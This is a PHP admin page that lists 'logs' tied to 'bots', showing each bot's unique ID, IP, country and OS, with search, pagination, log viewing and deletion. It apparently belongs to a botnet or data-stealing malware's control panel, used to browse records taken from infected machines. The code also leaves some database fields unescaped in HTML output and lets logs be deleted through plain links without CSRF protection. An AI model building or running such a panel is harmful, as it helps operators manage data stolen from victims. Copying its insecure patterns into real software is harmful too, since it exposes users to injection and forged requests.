<?php

require_once('inc/require.php');
require_once('inc/load.php');

if(!isset($_POST['ajax_response']))
{

if(isset($_GET['delete_id']))
{
	$res = mysql_query("DELETE FROM logs WHERE log_id='".(int)$_GET['delete_id']."'");
	if($res ) exit ('<script>location.href="?"</script>');
}

if(isset($_GET['delete_selected']))
{
	$delete_id_arr = $_POST['delete_array'];
	
	foreach($delete_id_arr as $id) 
	{
		$query="DELETE FROM logs WHERE log_id='".(int)$id."'";
		mysql_query($query);
	}
	exit ('<script>location.href="?"</script>');
}

require_once('inc/head_new.inc');
require_once('inc/menu.html');

?>
   <section id="content">
            <div class="wrapper">
                <div class="crumb">
                    <ul class="breadcrumb">
                      <li><a href="#"><i class="icon16 i-home-4"></i>Home</a> <span class="divider">/</span></li>
                      <li class="active">Logs</li>
                    </ul>
                </div>
                
				<div class="container-fluid">
                    <div id="heading" class="page-header">
                        <h1><i class="icon20 i-table-2"></i> Logs</h1>
                    </div>

                    <div class="row-fluid">

                        <div class="span12">

                            <div class="widget">
                                <div class="widget-title">
                                    <div class="icon"><i class="icon20 i-table"></i></div> 
                                    <h4>Logs</h4>
                                    <a href="#" class="minimize"></a>
                                </div><!-- End .widget-title -->
           
                                <div class="widget-content">
									<input id="query" type="text" placeholder="Search" onKeyUp="searchStart(this.value)"  onChange="searchStart(this.value)" onKeyPress="searchStart(this.value)" onEnter="searchStart(this.value)"  value="<?php if(isset($_GET['query'])) echo htmlspecialchars(strip_tags($_GET['query']));?>"/> 
									 <a href="javascript:CheckAll();" class="btn tip" style="float: right;">Select All</i></a>
								  <span id="container">
                                  <?php }?>
									<form method="post" action="?delete_selected=1">
                                    <table cellpadding="0" cellspacing="0" border="0" class="table table-striped table-bordered table-hover" id="dataTable">
                                              <thead>
                                            <tr>
                                                <th width="42%">Bot Info</th>
												<th width="32%">Log Url</th>
                                                <th width="10%">Date</th>
                                                <th width="10%">Action</th>
												<th>Select</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                        
                                        <?php
										
										$where = ' WHERE 1=1 and is_error!=1';
																			
										
										
										
											if(isset($_GET['query']))
										{
										$query= mysql_real_escape_string(strip_tags(urldecode($_GET['query'])));
										
										$time_Query = '';
										
										if(count(explode('/', $query))==3) 
										{										
										$startTime =strtotime($query.' 00:00:00');
										$endTime = strtotime($query.' 23:59:59');
										if($startTime>0 && $endTime>0) $time_Query = "or (date >=$startTime and date<=$endTime)";
										}
										
										$where = " WHERE (
										log LIKE '%$query%' 
										or log_url LIKE '%$query%'
										or os LIKE '$query%' 
										or country LIKE '$query%' 
										or ip LIKE '%$query%' 
										or unique_id LIKE '$query'
										$time_Query
										) and is_error!=1";
										$q = 'query='.urlencode($query);										
										}
										else
										
										{
										$q = "";

										if(isset($_GET['os']))
										{
										$query= mysql_real_escape_string(strip_tags($_GET['os']));
										$where = " WHERE (os ='$query')";	
										$q = 'os='.htmlspecialchars(strip_tags($_GET['os']));											
										}
										elseif(isset($_GET['ip']))
										{
										$query= mysql_real_escape_string(strip_tags($_GET['ip']));
										$where = " WHERE (ip ='$query')";				
										$q = 'ip='.htmlspecialchars(strip_tags($_GET['ip']));								
										}
										elseif(isset($_GET['country']))
										{
										$query= mysql_real_escape_string(strip_tags($_GET['country']));
										$where = " WHERE (country ='$query')";										
										$q = 'country='.htmlspecialchars(strip_tags($_GET['country']));											
										}
										elseif(isset($_GET['unique_id']))
										{
										$query= mysql_real_escape_string(strip_tags($_GET['unique_id']));
										$where = " WHERE (unique_id ='$query')";
										
										$q = 'unique_id='.htmlspecialchars(strip_tags($_GET['unique_id']));											
										}
										
										elseif(isset($_GET['log_url']))
										{
										$query= mysql_real_escape_string(strip_tags($_GET['log_url']));
										$where = " WHERE (log_url ='$query')";
										
										$q = 'log_url='.htmlspecialchars(strip_tags($_GET['log_url']));											
										}
										
										}
										
										$strSQL = "SELECT COUNT(*) FROM logs ".$where;

$objQuery = mysql_query($strSQL) or die ("Error Query [".$strSQL."]");
$Num_Rows = mysql_fetch_row($objQuery);
$Num_Rows = (int)$Num_Rows[0];


$Per_Page = $_vars['limit_entries'];

if (!isset($_GET['Page'])) {
    $Page = 1;
} else {
    $Page = (int)$_GET['Page'];
}

$Prev_Page = $Page - 1;
$Next_Page = $Page + 1;

$Page_Start = (($Per_Page * $Page) - $Per_Page);
$Page_End = $Page_Start + $Per_Page;

if ($Num_Rows <= $Per_Page) {
    $Num_Pages = 1;
} elseif (($Num_Rows % $Per_Page) == 0) {
    $Num_Pages = ($Num_Rows / $Per_Page) ;
} else {
    $Num_Pages = ($Num_Rows / $Per_Page) + 1;
    $Num_Pages = (int) $Num_Pages;
}

										$objQuery = mysql_query("SELECT * FROM logs $where ORDER BY date DESC LIMIT $Page_Start, $Per_Page");
                                        while($row= mysql_fetch_array($objQuery))
                                        {
										$log_url = (strlen($row['log_url']) > 100) ? substr($row['log_url'], 0, 97) . ' ...' : $row['log_url'];
                                        echo '
                                        
                                            <tr class="gradeA">
                                                <td class="center vcenter">
													<table cellpadding="0" cellspacing="0" border="0" class="table table-striped table-bordered table-hover" id="BotInfo">
														<tr style=""><td>Unique ID</td><td><a href="?unique_id='.htmlspecialchars($row['unique_id']).'">'.htmlspecialchars($row['unique_id']).'</a></td></tr>
														<tr><td>IP</td><td><a href="?ip='.htmlspecialchars($row['ip']).'">'.htmlspecialchars($row['ip']).'</a> <a class="botinfo_'.$row['log_id'].'" id="botinfo_more" href="#" style="float: right;" onclick="botInfoMore('.$row['log_id'].');" />(Show More)</a></td></tr>
														<tr class="botinfo_'.$row['log_id'].'" id="botinfo_country" style="display:none;"><td>Country</td><td><a href="?country='.$row['country'].'"><img alt="" src="images/png/'.strtolower(htmlspecialchars($row['country'])).'.png"> '.$row['country'].'</a></td></tr>
														<tr class="botinfo_'.$row['log_id'].'" id="botinfo_os" style="display:none;"><td>OS</td><td><a href="?os='.$row['os'].'">'.$row['os'].'</a> <a id="botinfo_less" href="#" style="float: right;" onclick="botInfoLess('.$row['log_id'].');" />(Show Less)</a></td></tr>
													</table>
												</td>
												<td class="center vcenter">' .htmlspecialchars($log_url). '</td>
                                                <td class="center vcenter">'.date("H:i:s m/d/Y ", $row['date']).'</td>
                                                <td class="center vcenter">
                                                    <div class="btn-group">
                                                        <a href="javascript:ShowLog(\''.htmlspecialchars($row['unique_id']).'\', '.$row['log_id'].');" class="btn tip" title="Show logs from this entry">Show logs</i></a> <a href="?delete_id='.$row['log_id'].'" class="btn tip" title="Delete this log" onClick="return confirm(\'You sure?\')">Delete log</i></a>
                                                    </div>
                                                </td>
												<td class="center vcenter"><input type="checkbox" name="delete_array[]" value="'.$row['log_id'].'"></td>
                                            </tr>';
                                          
										   }
										   ?>
                                           
                                        </tbody>
                                      
                                    </table>
									<input class="btn tip" style="float: right;" type="submit" value="Delete Selected">
                                    </form>
                                    
                                    <?php
									
echo"Showing $Page_Start to $Page_End of $Num_Rows entries ";


if ($Prev_Page) {
	echo " <a href ='$_SERVER[SCRIPT_NAME]?Page=1&$q'><<</a> ";
    echo " &nbsp;<a href ='$_SERVER[SCRIPT_NAME]?Page=$Prev_Page&$q'><</a> &nbsp;";
}

$Start_Page = max(1, $Page - 4);
$End_Page = min($Num_Pages, $Start_Page + 8);

for ($i = $Start_Page; $i <= $End_Page; $i++) {
	
    if ($i != $Page) {
        echo " <a href ='$_SERVER[SCRIPT_NAME]?Page=$i&$q'>$i</a> ";
    } else {
        echo "<b> $i </b>"; 
    }
}

if ($Page!=$Num_Pages) {
    echo " &nbsp;<a href ='$_SERVER[SCRIPT_NAME]?Page=$Next_Page&$q'>></a> ";    
	echo " &nbsp;<a href ='$_SERVER[SCRIPT_NAME]?Page=$Num_Pages&$q'>>></a> ";      
}

if(isset($_POST['ajax_response'])) exit;
?>

</span>
                                    
                                </div><!-- End .widget-content -->
                            </div><!-- End .widget -->
                        </div><!-- End .span12  --> 
                                            
                    </div><!-- End .row-fluid  -->
                    
                    
                     <a href="#myModal" id="myModalEvent" class="btn gap-right20" data-toggle="modal" style="display:None"></a>    <!-- Boostrap modal dialog -->
                                    <div id="myModal" class="modal hide fade" style="display: none; ">
                                        <div class="modal-header">
                                          <button type="button" class="close" data-dismiss="modal"><i class="icon16 i-close-2"></i></button>
                                          <h4 id="modal_title">View logs </h4>
                                        </div>
                                        <div class="modal-body">
                                          
                                          <p>
    		                             <textarea style="width:500px; height:300px" id="log_area">Loading...</textarea>
                                         </p>
                                        <div class="modal-footer">
                                          <a href="#" class="btn" data-dismiss="modal">Close</a>
                                      
                                        </div>
                                      
                                      </div>                                  
                          </div>
						  
<?php
require_once('inc/foot.inc');
?>